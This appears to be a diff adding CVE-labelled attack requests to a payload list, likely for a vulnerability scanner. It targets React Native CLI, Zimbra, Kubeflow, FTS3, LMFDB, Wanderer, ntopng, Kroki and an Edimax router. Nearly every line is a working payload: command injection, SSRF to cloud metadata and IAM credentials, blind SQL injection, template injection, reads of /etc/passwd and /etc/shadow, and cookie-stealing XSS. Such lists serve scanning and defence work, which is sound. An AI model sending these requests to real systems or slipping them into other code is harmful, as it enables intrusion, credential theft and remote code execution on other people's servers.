@@ -5176,3 +5176,52 @@ GET /get-artifacts?path=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
 # --- CVE-2026-105413 (Form Maker by 10Web): unauthenticated submissions are
 #     stored and rendered without escaping on the admin submissions page. ---
 POST /wp-admin/admin-ajax.php header="Content-Type: application/x-www-form-urlencoded" body="action=fm_submit&form_id=1&field=<script>alert(document.cookie)</script>"
+
+# --- CVE-2025-11953 (React Native Community CLI / Metro, KEV): the
+#     unauthenticated /open-url handler passes the url field to open(). ---
+POST /open-url header="Content-Type: application/json" body="{\"url\":\"cmd /c whoami\"}"
+POST /open-url header="Content-Type: application/json" body="{\"url\":\"powershell -NoProfile -Command whoami\"}"
+POST /open-url header="Content-Type: application/json" body="{\"url\":\"file:///tmp/payload;id\"}"
+
+# --- CVE-2025-68645 (Zimbra Collaboration, KEV): the Classic UI RestFilter
+#     turns an include path parameter into an internal JSP dispatch. ---
+GET /h/rest?javax.servlet.include.servlet_path=/WEB-INF/web.xml
+GET /h/rest?javax.servlet.include.servlet_path=/WEB-INF/web.xml&javax.servlet.include.path_info=/WEB-INF/web.xml
+GET /h/changepass?javax.servlet.include.servlet_path=/WEB-INF/web.xml
+
+# --- CVE-2026-88980 / CVE-2026-88981 (Kubeflow Pipelines): /artifacts/get
+#     fetches caller-selected hosts, including decimal-IP internal addresses
+#     and S3-compatible endpoints. ---
+GET /artifacts/get?source=http&bucket=2852039166&key=latest/meta-data/iam/security-credentials/
+GET /artifacts/get?source=http&bucket=2130706433&key=admin
+GET /artifacts/get?source=s3&providerInfo.Params.endpoint=http%3A%2F%2F169.254.169.254&key=probe
+
+# --- CVE-2025-71458 (FTS3 Web Monitoring): /linkinfo concatenates source_se
+#     and dest_se into a blind SQL query. ---
+GET /linkinfo?source_se=1%27%20AND%20SLEEP(5)%20--%20-&dest_se=2
+GET /linkinfo?source_se=https%3A%2F%2Fsource.example&dest_se=1%27%20OR%20%271%27%3D%271
+
+# --- CVE-2026-123198 (LMFDB): /knowledge/render compiles the content
+#     parameter as a Jinja template for unauthenticated callers. ---
+GET /knowledge/render/1?content=%7B%7B7*7%7D%7D
+POST /knowledge/render/1 header="Content-Type: application/x-www-form-urlencoded" body="content={{config.__class__.__init__.__globals__}}"
+
+# --- CVE-2026-71495 (Wanderer): the unauthenticated trail download handler
+#     fetches an arbitrary caller URL, including cloud metadata. ---
+POST /api/v1/trail/download header="Content-Type: application/json" body="{\"url\":\"http://169.254.169.254/latest/meta-data/\"}"
+POST /api/v1/trail/download header="Content-Type: application/json" body="{\"url\":\"http://127.0.0.1:8090/api/health\"}"
+
+# --- CVE-2026-82413 (ntopng): scan_ports reaches an nmap command through
+#     popen for authenticated and login-disabled deployments. ---
+POST /lua/rest/v2/add/host/to_scan.lua?scan_ports=1-1000%3Bid
+POST /lua/rest/v2/exec/host/schedule_vulnerability_scan.lua?scan_ports=1-1000%3B%2Fbin%2Fsh
+
+# --- CVE-2026-102359 (Kroki): the TikZ safe mode still allows TeX file-read
+#     primitives, returning local files in the rendered SVG. ---
+POST /tikz/svg header="Content-Type: text/plain" body="\\input{/etc/passwd}"
+POST /tikz/svg header="Content-Type: text/plain" body="\\openin1=/etc/shadow"
+
+# --- CVE-2026-122051 (Edimax BR-6208AC): /goform/mp passes the command
+#     parameter to /bin/rftest.sh through system(). ---
+POST /goform/mp header="Content-Type: application/x-www-form-urlencoded" body="command=;id"
+POST /goform/mp header="Content-Type: application/x-www-form-urlencoded" body="command=1%3Bcat%20%2Fetc%2Fpasswd"
